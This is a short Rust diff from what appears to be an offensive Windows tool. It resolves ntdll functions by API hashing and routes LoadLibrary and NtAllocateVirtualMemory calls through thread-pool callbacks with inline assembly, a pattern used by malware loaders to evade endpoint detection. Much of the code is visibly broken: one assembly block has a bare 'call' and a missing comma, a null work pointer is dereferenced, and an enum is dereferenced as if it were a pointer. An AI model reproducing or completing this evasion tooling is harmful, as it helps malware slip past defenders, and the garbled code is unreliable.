@@ -1,6 +1,5 @@
 use core::ptr::null;
-use windows_sys::Win32::Foundation::HANDLE;
-use windows_sys::Win32::System::Kernel::NULL64;
+
 use windows_sys::Win32::System::Threading::{PTP_CALLBACK_INSTANCE, PTP_WORK, PTP_WORK_CALLBACK, TP_CALLBACK_ENVIRON_V3};
 use crate::{
     api_hashing::{
@@ -13,7 +12,8 @@ use crate::{
     TP_RELEASE_WORK_HASH,
     NTSTATUS,
     c_void,
-    asm
+    asm,
+    HANDLE
 };
 
 type TpAllocWork = unsafe extern "system" fn(*mut PTP_WORK, PTP_WORK_CALLBACK, *mut c_void, *mut TP_CALLBACK_ENVIRON_V3) -> NTSTATUS;
@@ -21,7 +21,7 @@ type TpPostWork = unsafe extern "system" fn(PTP_WORK);
 type TpReleaseWork = unsafe extern "system" fn(PTP_WORK);
 
 #[link_section = ".text"]
-pub unsafe fn exec_callback(args: function) -> bool {
+pub unsafe fn exec_callback(args: functions_enum) -> bool {
 
     let ntdll_address = get_module_handle(NTDLL_HASH).unwrap();
 
@@ -32,10 +32,10 @@ pub unsafe fn exec_callback(args: function) -> bool {
     let work_return: PTP_WORK = 0;
 
     match args {
-        function::load_library_args => {
+        functions_enum::load_library_args => {
             tp_alloc_work(*work_return, (*loadlibrary_callback) as PTP_CALLBACK_INSTANCE, *args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
         },
-        function::nt_alloc_args => {
+        functions_enum::nt_alloc_args => {
             tp_alloc_work(*work_return, (*nt_allocate_callback) as PTP_CALLBACK_INSTANCE, *args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
         }
     }
@@ -49,7 +49,7 @@ pub unsafe fn exec_callback(args: function) -> bool {
 pub unsafe extern "stdcall" fn loadlibrary_callback(instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, work: PTP_WORK) {
     asm!("mov rbx, rdx",
          "xor rdx, rdx",
-         "call get_function_address"
+         "call"
          "jmp rax"
         )
 }
@@ -69,7 +69,7 @@ pub unsafe extern "stdcall" fn nt_allocate_callback(instance: PTP_CALLBACK_INSTA
     jmp rax)
 }
 
-enum function {
+pub enum functions_enum {
     nt_alloc_args,
     load_library_args
 }
